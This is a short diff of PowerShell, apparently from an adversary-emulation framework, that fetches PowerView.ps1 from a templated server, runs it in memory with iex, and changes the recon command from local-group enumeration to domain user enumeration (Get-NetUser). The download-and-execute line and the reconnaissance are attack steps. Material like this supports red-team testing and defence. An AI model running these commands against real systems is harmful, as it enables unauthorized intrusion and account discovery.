@@ -14,4 +14,4 @@
         $web = (New-Object System.Net.WebClient)
         $web.Headers.add("file","PowerView.ps1")
         $result = $web.uploadString("#{server}/file/download","")
-        iex $result; Get-NetLocalGroup -ComputerName #{host.fqdn} -Recurse | ConvertTo-Json;
+        iex $result; Get-NetUser | ConvertTo-Json
